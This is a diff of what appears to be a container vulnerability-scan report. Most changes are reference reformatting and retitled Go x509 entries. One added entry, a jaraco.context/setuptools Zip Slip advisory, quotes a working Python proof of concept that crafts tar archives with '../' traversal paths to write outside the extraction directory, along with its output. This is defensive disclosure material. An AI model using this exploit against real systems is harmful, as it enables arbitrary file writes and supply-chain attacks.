@@ -1138,7 +1138,311 @@
 │     │                        │                      d229b68f52d773 
 │     │                        ╰ FilePath  : usr/lib/python3.12/site-packages/setuptools/_vendor/zipp-3.19.2.di
 │     │                                      st-info/METADATA 
-│     ╰ Vulnerabilities ─ [0] ╭ VulnerabilityID : CVE-2025-8869 
+│     ╰ Vulnerabilities ╭ [0] ╭ VulnerabilityID : GHSA-58pv-8j8x-9vj2 
+│                       │     ├ PkgName         : jaraco.context 
+│                       │     ├ PkgPath         : usr/lib/python3.12/site-packages/setuptools/_vendor/jaraco.co
+│                       │     │                   ntext-5.3.0.dist-info/METADATA 
+│                       │     ├ PkgIdentifier    ╭ PURL: pkg:pypi/jaraco.context@5.3.0 
+│                       │     │                  ╰ UID : 39de216176e80d7f 
+│                       │     ├ InstalledVersion: 5.3.0 
+│                       │     ├ FixedVersion    : 6.1.0 
+│                       │     ├ Status          : fixed 
+│                       │     ├ Layer            ╭ Digest: sha256:07ea076c6cf197f1aa824b3abdc29f7138e13b80f8e5c
+│                       │     │                  │         23d576cc7fbfc24b686 
+│                       │     │                  ╰ DiffID: sha256:dec68ef13d7f89a7af98553a8fe998c330c065d7a3950
+│                       │     │                            478f2d229b68f52d773 
+│                       │     ├ SeveritySource  : ghsa 
+│                       │     ├ PrimaryURL      : https://github.com/advisories/GHSA-58pv-8j8x-9vj2 
+│                       │     ├ DataSource       ╭ ID  : ghsa 
+│                       │     │                  ├ Name: GitHub Security Advisory pip 
+│                       │     │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ec
+│                       │     │                          osystem%3Apip 
+│                       │     ├ Fingerprint     : sha256:1c161d66fe31cb7f3b2be833cb3294efdf7112ac9038ffa1fecc95
+│                       │     │                   7b696aaf68 
+│                       │     ├ Title           : jaraco.context Has a Path Traversal Vulnerability 
+│                       │     ├ Description     : ### Summary
+│                       │     │                   There is a Zip Slip path traversal vulnerability in the
+│                       │     │                   jaraco.context package affecting setuptools as well, in
+│                       │     │                   `jaraco.context.tarball()` function. The vulnerability may
+│                       │     │                   allow attackers to extract files outside the intended
+│                       │     │                   extraction directory when malicious tar archives are
+│                       │     │                   processed.
+│                       │     │                   The strip_first_component filter splits the path on the first
+│                       │     │                    `/` and extracts the second component, while allowing `../`
+│                       │     │                   sequences. Paths like `dummy_dir/../../etc/passwd` become
+│                       │     │                   `../../etc/passwd`.
+│                       │     │                   Note that this suffers from a nested tarball attack as well
+│                       │     │                   with multi-level tar files such as `dummy_dir/inner.tar.gz`,
+│                       │     │                   where the inner.tar.gz includes a traversal
+│                       │     │                   `dummy_dir/../../config/.env` that also gets translated to
+│                       │     │                   `../../config/.env`.
+│                       │     │                   
+│                       │     │                   The code can be found:
+│                       │     │                   -
+│                       │     │                   https://github.com/jaraco/jaraco.context/blob/main/jaraco/con
+│                       │     │                   text/__init__.py#L74-L91
+│                       │     │                   https://github.com/pypa/setuptools/blob/main/setuptools/_vend
+│                       │     │                   or/jaraco/context.py#L55-L76 (inherited)
+│                       │     │                   This report was also sent to setuptools maintainers and they
+│                       │     │                   asked some questions regarding this.
+│                       │     │                   The lengthy answer is:
+│                       │     │                   The vulnerability seems to be the `strip_first_component`
+│                       │     │                   filter function, not the tarball function itself and has the
+│                       │     │                   same behavior on any tested Python version locally (from 11
+│                       │     │                   to 14, as I noticed that there is a backports conditional for
+│                       │     │                    the tarball).
+│                       │     │                   The stock tarball for Python 3.12+ is considered not
+│                       │     │                   vulnerable (until proven otherwise 😄) but here the custom
+│                       │     │                   filter seems to overwrite the native filtering and introduces
+│                       │     │                    the issue - while overwriting the updated secure Python
+│                       │     │                   3.12+ behavior and giving a false sense of sanitization.
+│                       │     │                   The short answer is:
+│                       │     │                   If we are talking about Python < 3.12 the tarball and jaraco
+│                       │     │                   implementations /  behaviors are relatively the same but for
+│                       │     │                   Python 3.12+ the jaraco implementation overwrites the native
+│                       │     │                   tarball protection.
+│                       │     │                   Sampled tests:
+│                       │     │                   <img width="1634" height="245" alt="image"
+│                       │     │                   src="https://github.com/user-attachments/assets/ce6c0de6-bb53
+│                       │     │                   -4c2b-818a-d77e28d2fbeb" />
+│                       │     │                   ### Details
+│                       │     │                   The flow with setuptools in the mix:
+│                       │     │                   ```
+│                       │     │                   setuptools._vendor.jaraco.context.tarball() > req =
+│                       │     │                   urlopen(url) > with tarfile.open(fileobj=req, mode='r|*') as
+│                       │     │                   tf: > tf.extractall(path=target_dir,
+│                       │     │                   filter=strip_first_component) > strip_first_component
+│                       │     │                   (Vulnerable)
+│                       │     │                   ### PoC
+│                       │     │                   This was tested on multiple Python versions > 11 on a Debian
+│                       │     │                   GNU 12 (bookworm).
+│                       │     │                   You can run this directly after having all the dependencies:
+│                       │     │                   ```py
+│                       │     │                   #!/usr/bin/env python3
+│                       │     │                   import tarfile
+│                       │     │                   import io
+│                       │     │                   import os
+│                       │     │                   import sys
+│                       │     │                   import shutil
+│                       │     │                   import tempfile
+│                       │     │                   from setuptools._vendor.jaraco.context import
+│                       │     │                   strip_first_component
+│                       │     │                   def create_malicious_tarball():
+│                       │     │                       tar_data = io.BytesIO()
+│                       │     │                       with tarfile.open(fileobj=tar_data, mode='w') as tar:
+│                       │     │                           # Create a malicious file path with traversal
+│                       │     │                   sequences
+│                       │     │                           malicious_files = [
+│                       │     │                               # Attempt 1: Simple traversal to /tmp
+│                       │     │                               {
+│                       │     │                                   'path':
+│                       │     │                   'dummy_dir/../../tmp/pwned_by_zipslip.txt',
+│                       │     │                                   'content': b'[ZIPSLIP] File written to /tmp
+│                       │     │                   via path traversal!',
+│                       │     │                                   'name': 'pwned_via_tmp'
+│                       │     │                               },
+│                       │     │                               # Attempt 2: Try to write to home directory
+│                       │     │                   'dummy_dir/../../../../home/pwned_home.txt',
+│                       │     │                                   'content': b'[ZIPSLIP] Attempted write to
+│                       │     │                   home directory',
+│                       │     │                                   'name': 'pwned_via_home'
+│                       │     │                               # Attempt 3: Try to write to current directory
+│                       │     │                   parent
+│                       │     │                                   'path': 'dummy_dir/../escaped.txt',
+│                       │     │                                   'content': b'[ZIPSLIP] File in parent
+│                       │     │                   directory!',
+│                       │     │                                   'name': 'pwned_escaped'
+│                       │     │                               # Attempt 4: Legitimate file for comparison
+│                       │     │                                   'path': 'dummy_dir/legitimate_file.txt',
+│                       │     │                                   'content': b'This file stays in target
+│                       │     │                   directory',
+│                       │     │                                   'name': 'legitimate'
+│                       │     │                               }
+│                       │     │                           ]
+│                       │     │                           for file_info in malicious_files:
+│                       │     │                               content = file_info['content']
+│                       │     │                               tarinfo =
+│                       │     │                   tarfile.TarInfo(name=file_info['path'])
+│                       │     │                               tarinfo.size = len(content)
+│                       │     │                               tar.addfile(tarinfo, io.BytesIO(content))
+│                       │     │                       tar_data.seek(0)
+│                       │     │                       return tar_data
+│                       │     │                   def exploit_zipslip():
+│                       │     │                       print("[*] Target:
+│                       │     │                   setuptools._vendor.jaraco.context.tarball()")
+│                       │     │                       # Create temporary directory for extraction
+│                       │     │                       temp_base = tempfile.mkdtemp(prefix="zipslip_test_")
+│                       │     │                       target_dir = os.path.join(temp_base,
+│                       │     │                   "extraction_target")
+│                       │     │                       try:
+│                       │     │                           os.mkdir(target_dir)
+│                       │     │                           print(f"[+] Created target extraction directory:
+│                       │     │                   {target_dir}")
+│                       │     │                           # Create malicious tarball
+│                       │     │                           print("[*] Creating malicious tar archive...")
+│                       │     │                           tar_data = create_malicious_tarball()
+│                       │     │                           try:
+│                       │     │                               with tarfile.open(fileobj=tar_data, mode='r') as
+│                       │     │                   tf:
+│                       │     │                                   for member in tf:
+│                       │     │                                       # Apply the ACTUAL vulnerable function
+│                       │     │                   from setuptools
+│                       │     │                                       processed_member =
+│                       │     │                   strip_first_component(member, target_dir)
+│                       │     │                                       print(f"[*] Extracting: {member.name:40}
+│                       │     │                   -> {processed_member.name}")
+│                       │     │                                       
+│                       │     │                                       # Extract to target directory
+│                       │     │                                       try:
+│                       │     │                                           tf.extract(processed_member,
+│                       │     │                   path=target_dir)
+│                       │     │                                           print(f"    ✓ Extracted
+│                       │     │                   successfully")
+│                       │     │                                       except (PermissionError,
+│                       │     │                   FileNotFoundError) as e:
+│                       │     │                                           print(f"    ! {type(e).__name__}:
+│                       │     │                   Path traversal ATTEMPTED")
+│                       │     │                           except Exception as e:
+│                       │     │                               print(f"[!] Extraction raised exception:
+│                       │     │                   {type(e).__name__}: {e}")
+│                       │     │                           
+│                       │     │                           # Check results
+│                       │     │                           print("[*] Checking for extracted files...")
+│                       │     │                           # Check target directory
+│                       │     │                           print(f"[*] Files in target directory
+│                       │     │                   ({target_dir}):")
+│                       │     │                           if os.path.exists(target_dir):
+│                       │     │                               for root, _, files in os.walk(target_dir):
+│                       │     │                                   level = root.replace(target_dir,
+│                       │     │                   '').count(os.sep)
+│                       │     │                                   indent = ' ' * 2 * level
+│                       │     │                                   print(f"{indent}{os.path.basename(root)}/")
+│                       │     │                                   subindent = ' ' * 2 * (level + 1)
+│                       │     │                                   for file in files:
+│                       │     │                                       filepath = os.path.join(root, file)
+│                       │     │                                           with open(filepath, 'r') as f:
+│                       │     │                                               content = f.read()[:50]
+│                       │     │                                           print(f"{subindent}{file}")
+│                       │     │                                           print(f"{subindent}  └─
+│                       │     │                   {content}...")
+│                       │     │                                       except:
+│                       │     │                                           print(f"{subindent}{file} (binary)")
+│                       │     │                           else:
+│                       │     │                               print(f"[!] Target directory not found!")
+│                       │     │                           print()
+│                       │     │                           print("[*] Checking for traversal attempts...")
+│                       │     │                           # Check if files escaped
+│                       │     │                           traversal_attempts = [
+│                       │     │                               ("/tmp/pwned_by_zipslip.txt", "Escape to /tmp"),
+│                       │     │                               (os.path.expanduser("~/pwned_home.txt"), "Escape
+│                       │     │                   to home"),
+│                       │     │                               (os.path.join(temp_base, "escaped.txt"), "Escape
+│                       │     │                   to parent"),
+│                       │     │                           escaped = False
+│                       │     │                           for check_path, description in traversal_attempts:
+│                       │     │                               if os.path.exists(check_path):
+│                       │     │                                   print(f"[+] Path Traversal Confirmed:
+│                       │     │                   {description}")
+│                       │     │                                   print(f"      File created at:
+│                       │     │                   {check_path}")
+│                       │     │                                   try:
+│                       │     │                                       with open(check_path, 'r') as f:
+│                       │     │                                           content = f.read()
+│                       │     │                                       print(f"      Content: {content}")
+│                       │     │                                       print(f"      Removing: {check_path}")
+│                       │     │                                       os.remove(check_path)
+│                       │     │                                   except Exception as e:
+│                       │     │                                       print(f"      Error reading: {e}")
+│                       │     │                                   escaped = True
+│                       │     │                               else:
+│                       │     │                                   print(f"[-] OK: {description} - No escape
+│                       │     │                   detected")
+│                       │     │                           if escaped:
+│                       │     │                               print("[+] EXPLOIT SUCCESSFUL - Path traversal
+│                       │     │                   vulnerability confirmed!")
+│                       │     │                               print("[-] No path traversal detected (mitigation
+│                       │     │                    in place)")
+│                       │     │                       finally:
+│                       │     │                           # Cleanup
+│                       │     │                           print(f"[*] Cleaning up: {temp_base}")
+│                       │     │                               shutil.rmtree(temp_base)
+│                       │     │                               print(f"[!] Cleanup error: {e}")
+│                       │     │                   def check_python_version():
+│                       │     │                       print(f"[+] Python version: {sys.version}")
+│                       │     │                       # Python 3.11.4+ added DEFAULT_FILTER
+│                       │     │                       if hasattr(tarfile, 'DEFAULT_FILTER'):
+│                       │     │                           print("[+] Python has DEFAULT_FILTER (tarfile
+│                       │     │                   security hardening)")
+│                       │     │                       else:
+│                       │     │                           print("[!] Python does not have DEFAULT_FILTER (older
+│                       │     │                    version)")    
+│                       │     │                       print()
+│                       │     │                   if __name__ == "__main__":
+│                       │     │                       check_python_version()
+│                       │     │                       exploit_zipslip()
+│                       │     │                   Output:
+│                       │     │                   [+] Python version: 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC
+│                       │     │                    12.2.0] 
+│                       │     │                   [!] Python does not have DEFAULT_FILTER (older version) 
+│                       │     │                   [*] Target: setuptools._vendor.jaraco.context.tarball() 
+│                       │     │                   [+] Created target extraction directory:
+│                       │     │                   /tmp/zipslip_test_tnu3qpd5/extraction_target 
+│                       │     │                   [*] Creating malicious tar archive... 
+│                       │     │                   [*] Extracting: ../../tmp/pwned_by_zipslip.txt           ->
+│                       │     │                   ../../tmp/pwned_by_zipslip.txt 
+│                       │     │                       ✓ Extracted successfully 
+│                       │     │                   [*] Extracting: ../../../../home/pwned_home.txt          ->
+│                       │     │                   ../../../../home/pwned_home.txt 
+│                       │     │                       ! PermissionError: Path traversal ATTEMPTED 
+│                       │     │                   [*] Extracting: ../escaped.txt                           ->
+│                       │     │                   ../escaped.txt 
+│                       │     │                   [*] Extracting: legitimate_file.txt                      ->
+│                       │     │                   legitimate_file.txt 
+│                       │     │                   [*] Checking for extracted files... 
+│                       │     │                   [*] Files in target directory
+│                       │     │                   (/tmp/zipslip_test_tnu3qpd5/extraction_target): 
+│                       │     │                   extraction_target/ 
+│                       │     │                     legitimate_file.txt 
+│                       │     │                       └─ This file stays in target directory... 
+│                       │     │                   [*] Checking for traversal attempts... 
+│                       │     │                   [-] OK: Escape to /tmp - No escape detected 
+│                       │     │                   [-] OK: Escape to home - No escape detected 
+│                       │     │                   [+] Path Traversal Confirmed: Escape to parent 
+│                       │     │                         File created at: /tmp/zipslip_test_tnu3qpd5/escaped.txt
+│                       │     │                    
+│                       │     │                         Content: [ZIPSLIP] File in parent directory! 
+│                       │     │                         Removing: /tmp/zipslip_test_tnu3qpd5/escaped.txt 
+│                       │     │                   [+] EXPLOIT SUCCESSFUL - Path traversal vulnerability
+│                       │     │                   confirmed! 
+│                       │     │                   [*] Cleaning up: /tmp/zipslip_test_tnu3qpd5
+│                       │     │                   ### Impact
+│                       │     │                   - Arbitrary file creation in filesystem (HIGH exploitability)
+│                       │     │                    - especially if popular packages download tar files remotely
+│                       │     │                    and use this package to extract files.
+│                       │     │                   - Privesc (LOW exploitability)
+│                       │     │                   - Supply-Chain attack (VARIABLE exploitability) - relevant to
+│                       │     │                    the first point.
+│                       │     │                   ### Remediation
+│                       │     │                   I guess removing the custom filter is not feasible given the
+│                       │     │                   backward compatibility issues that might come up you can use
+│                       │     │                   a safer filter `strip_first_component` that skips or
+│                       │     │                   sanitizes `../` character sequences since it is already there
+│                       │     │                    eg.
+│                       │     │                   if member.name.startswith('/') or '..' in member.name:
+│                       │     │                     raise ValueError(f"Attempted path traversal detected:
+│                       │     │                   {member.name}") 
+│                       │     ├ Severity        : HIGH 
+│                       │     ├ VendorSeverity   ─ ghsa: 3 
+│                       │     ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N 
+│                       │     │                         ╰ V3Score : 8.6 
+│                       │     ├ References       ╭ [0]: https://github.com/jaraco/jaraco.context 
+│                       │     │                  ├ [1]: https://github.com/jaraco/jaraco.context/commit/7b26a42
+│                       │     │                  │      b525735e4085d2e994e13802ea339d5f9 
+│                       │     │                  ╰ [2]: https://github.com/jaraco/jaraco.context/security/advis
+│                       │     │                         ories/GHSA-58pv-8j8x-9vj2 
+│                       │     ├ PublishedDate   : 2026-01-13T21:48:17Z 
+│                       │     ╰ LastModifiedDate: 2026-01-13T21:48:17Z 
+│                       ╰ [1] ╭ VulnerabilityID : CVE-2025-8869 
 │                             ├ PkgName         : pip 
 │                             ├ PkgPath         : usr/lib/python3.12/site-packages/pip-25.1.1.dist-info/METADATA 
 │                             ├ PkgIdentifier    ╭ PURL: pkg:pypi/pip@25.1.1 
@@ -3813,19 +4117,20 @@
 │                       │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
 │                       │      │                           │           /A:L 
 │                       │      │                           ╰ V3Score : 5.3 
-│                       │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2025-58181 
-│                       │      │                  ├ [1]: https://github.com/golang/crypto/commit/e79546e28b85ea
-│                       │      │                  │      53dd37afe1c4102746ef553b9c 
-│                       │      │                  ├ [2]: https://github.com/golang/go/issues/76363 
-│                       │      │                  ├ [3]: https://go.dev/cl/721961 
-│                       │      │                  ├ [4]: https://go.dev/issue/76363 
-│                       │      │                  ├ [5]: https://groups.google.com/g/golang-announce/c/w-oX3UxN
-│                       │      │                  │      cZA 
-│                       │      │                  ├ [6]: https://groups.google.com/g/golang-announce/c/w-oX3UxN
-│                       │      │                  │      cZA?pli=1 
-│                       │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2025-58181 
-│                       │      │                  ├ [8]: https://pkg.go.dev/vuln/GO-2025-4134 
-│                       │      │                  ╰ [9]: https://www.cve.org/CVERecord?id=CVE-2025-58181 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/security/cve/CVE-2025-58181 
+│                       │      │                  ├ [1] : https://github.com/golang/crypto/commit/e79546e28b85e
+│                       │      │                  │       a53dd37afe1c4102746ef553b9c 
+│                       │      │                  ├ [2] : https://github.com/golang/go/issues/76363 
+│                       │      │                  ├ [3] : https://go.dev/cl/721961 
+│                       │      │                  ├ [4] : https://go.dev/issue/76363 
+│                       │      │                  ├ [5] : https://groups.google.com/g/golang-announce/c/w-oX3Ux
+│                       │      │                  │       NcZA 
+│                       │      │                  ├ [6] : https://groups.google.com/g/golang-announce/c/w-oX3Ux
+│                       │      │                  │       NcZA?pli=1 
+│                       │      │                  ├ [7] : https://nvd.nist.gov/vuln/detail/CVE-2025-58181 
+│                       │      │                  ├ [8] : https://pkg.go.dev/vuln/GO-2025-4134 
+│                       │      │                  ├ [9] : https://ubuntu.com/security/notices/USN-7956-1 
+│                       │      │                  ╰ [10]: https://www.cve.org/CVERecord?id=CVE-2025-58181 
 │                       │      ├ PublishedDate   : 2025-11-19T21:15:50.85Z 
 │                       │      ╰ LastModifiedDate: 2025-12-11T19:29:24.9Z 
 │                       ├ [5]  ╭ VulnerabilityID : CVE-2025-47907 
@@ -3966,8 +4271,8 @@
 │                       │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
 │                       │      ├ Fingerprint     : sha256:1e94257f916baed5d11d17c7050cf479df672e83b639bbcc13bdf
 │                       │      │                   d7c1a99718c 
-│                       │      ├ Title           : crypto/x509: Excessive resource consumption when printing
-│                       │      │                   error string for host certificate validation in crypto/x509 
+│                       │      ├ Title           : crypto/x509: golang: Denial of Service due to excessive
+│                       │      │                   resource consumption via crafted certificate 
 │                       │      ├ Description     : Within HostnameError.Error(), when constructing an error
 │                       │      │                   string, there is no limit to the number of hosts that will
 │                       │      │                   be printed out. Furthermore, the error string is constructed
@@ -7006,19 +7311,20 @@
 │                       │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
 │                       │      │                           │           /A:L 
 │                       │      │                           ╰ V3Score : 5.3 
-│                       │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2025-58181 
-│                       │      │                  ├ [1]: https://github.com/golang/crypto/commit/e79546e28b85ea
-│                       │      │                  │      53dd37afe1c4102746ef553b9c 
-│                       │      │                  ├ [2]: https://github.com/golang/go/issues/76363 
-│                       │      │                  ├ [3]: https://go.dev/cl/721961 
-│                       │      │                  ├ [4]: https://go.dev/issue/76363 
-│                       │      │                  ├ [5]: https://groups.google.com/g/golang-announce/c/w-oX3UxN
-│                       │      │                  │      cZA 
-│                       │      │                  ├ [6]: https://groups.google.com/g/golang-announce/c/w-oX3UxN
-│                       │      │                  │      cZA?pli=1 
-│                       │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2025-58181 
-│                       │      │                  ├ [8]: https://pkg.go.dev/vuln/GO-2025-4134 
-│                       │      │                  ╰ [9]: https://www.cve.org/CVERecord?id=CVE-2025-58181 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/security/cve/CVE-2025-58181 
+│                       │      │                  ├ [1] : https://github.com/golang/crypto/commit/e79546e28b85e
+│                       │      │                  │       a53dd37afe1c4102746ef553b9c 
+│                       │      │                  ├ [2] : https://github.com/golang/go/issues/76363 
+│                       │      │                  ├ [3] : https://go.dev/cl/721961 
+│                       │      │                  ├ [4] : https://go.dev/issue/76363 
+│                       │      │                  ├ [5] : https://groups.google.com/g/golang-announce/c/w-oX3Ux
+│                       │      │                  │       NcZA 
+│                       │      │                  ├ [6] : https://groups.google.com/g/golang-announce/c/w-oX3Ux
+│                       │      │                  │       NcZA?pli=1 
+│                       │      │                  ├ [7] : https://nvd.nist.gov/vuln/detail/CVE-2025-58181 
+│                       │      │                  ├ [8] : https://pkg.go.dev/vuln/GO-2025-4134 
+│                       │      │                  ├ [9] : https://ubuntu.com/security/notices/USN-7956-1 
+│                       │      │                  ╰ [10]: https://www.cve.org/CVERecord?id=CVE-2025-58181 
 │                       │      ├ PublishedDate   : 2025-11-19T21:15:50.85Z 
 │                       │      ╰ LastModifiedDate: 2025-12-11T19:29:24.9Z 
 │                       ├ [5]  ╭ VulnerabilityID : CVE-2025-47907 
@@ -7159,8 +7465,8 @@
 │                       │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
 │                       │      ├ Fingerprint     : sha256:a6831174c92d740abf066222c0ba03dff0a293ffc1ee1d79475b3
 │                       │      │                   a78effba257 
-│                       │      ├ Title           : crypto/x509: Excessive resource consumption when printing
-│                       │      │                   error string for host certificate validation in crypto/x509 
+│                       │      ├ Title           : crypto/x509: golang: Denial of Service due to excessive
+│                       │      │                   resource consumption via crafted certificate 
 │                       │      ├ Description     : Within HostnameError.Error(), when constructing an error
 │                       │      │                   string, there is no limit to the number of hosts that will
 │                       │      │                   be printed out. Furthermore, the error string is constructed
@@ -15205,19 +15511,20 @@
 │                       │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
 │                       │      │                           │           /A:L 
 │                       │      │                           ╰ V3Score : 5.3 
-│                       │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2025-58181 
-│                       │      │                  ├ [1]: https://github.com/golang/crypto/commit/e79546e28b85ea
-│                       │      │                  │      53dd37afe1c4102746ef553b9c 
-│                       │      │                  ├ [2]: https://github.com/golang/go/issues/76363 
-│                       │      │                  ├ [3]: https://go.dev/cl/721961 
-│                       │      │                  ├ [4]: https://go.dev/issue/76363 
-│                       │      │                  ├ [5]: https://groups.google.com/g/golang-announce/c/w-oX3UxN
-│                       │      │                  │      cZA 
-│                       │      │                  ├ [6]: https://groups.google.com/g/golang-announce/c/w-oX3UxN
-│                       │      │                  │      cZA?pli=1 
-│                       │      │                  ├ [7]: https://nvd.nist.gov/vuln/detail/CVE-2025-58181 
-│                       │      │                  ├ [8]: https://pkg.go.dev/vuln/GO-2025-4134 
-│                       │      │                  ╰ [9]: https://www.cve.org/CVERecord?id=CVE-2025-58181 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/security/cve/CVE-2025-58181 
+│                       │      │                  ├ [1] : https://github.com/golang/crypto/commit/e79546e28b85e
+│                       │      │                  │       a53dd37afe1c4102746ef553b9c 
+│                       │      │                  ├ [2] : https://github.com/golang/go/issues/76363 
+│                       │      │                  ├ [3] : https://go.dev/cl/721961 
+│                       │      │                  ├ [4] : https://go.dev/issue/76363 
+│                       │      │                  ├ [5] : https://groups.google.com/g/golang-announce/c/w-oX3Ux
+│                       │      │                  │       NcZA 
+│                       │      │                  ├ [6] : https://groups.google.com/g/golang-announce/c/w-oX3Ux
+│                       │      │                  │       NcZA?pli=1 
+│                       │      │                  ├ [7] : https://nvd.nist.gov/vuln/detail/CVE-2025-58181 
+│                       │      │                  ├ [8] : https://pkg.go.dev/vuln/GO-2025-4134 
+│                       │      │                  ├ [9] : https://ubuntu.com/security/notices/USN-7956-1 
+│                       │      │                  ╰ [10]: https://www.cve.org/CVERecord?id=CVE-2025-58181 
 │                       │      ├ PublishedDate   : 2025-11-19T21:15:50.85Z 
 │                       │      ╰ LastModifiedDate: 2025-12-11T19:29:24.9Z 
 │                       ├ [29] ╭ VulnerabilityID : CVE-2025-47907 
@@ -15358,8 +15665,8 @@
 │                       │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
 │                       │      ├ Fingerprint     : sha256:48b34607a5bd3ef223a081140a70ff538481efef10c370f49e047
 │                       │      │                   b85a0e68e6f 
-│                       │      ├ Title           : crypto/x509: Excessive resource consumption when printing
-│                       │      │                   error string for host certificate validation in crypto/x509 
+│                       │      ├ Title           : crypto/x509: golang: Denial of Service due to excessive
+│                       │      │                   resource consumption via crafted certificate 
 │                       │      ├ Description     : Within HostnameError.Error(), when constructing an error
 │                       │      │                   string, there is no limit to the number of hosts that will
 │                       │      │                   be printed out. Furthermore, the error string is constructed
@@ -17840,8 +18147,8 @@
 │                       │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
 │                       │      ├ Fingerprint     : sha256:2ea25af5d7745985d5837fc21bf7393d86a8ef83a8d41994b1987
 │                       │      │                   d521451dbc0 
-│                       │      ├ Title           : crypto/x509: Excessive resource consumption when printing
-│                       │      │                   error string for host certificate validation in crypto/x509 
+│                       │      ├ Title           : crypto/x509: golang: Denial of Service due to excessive
+│                       │      │                   resource consumption via crafted certificate 
 │                       │      ├ Description     : Within HostnameError.Error(), when constructing an error
 │                       │      │                   string, there is no limit to the number of hosts that will
 │                       │      │                   be printed out. Furthermore, the error string is constructed
@@ -20322,8 +20629,8 @@
                         │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
                         │      ├ Fingerprint     : sha256:4253f82369285c39c4f860600c26fa08eed898951e2cdd13db04a
                         │      │                   fc8fec5a7ad 
-                        │      ├ Title           : crypto/x509: Excessive resource consumption when printing
-                        │      │                   error string for host certificate validation in crypto/x509 
+                        │      ├ Title           : crypto/x509: golang: Denial of Service due to excessive
+                        │      │                   resource consumption via crafted certificate 
                         │      ├ Description     : Within HostnameError.Error(), when constructing an error
                         │      │                   string, there is no limit to the number of hosts that will
                         │      │                   be printed out. Furthermore, the error string is constructed
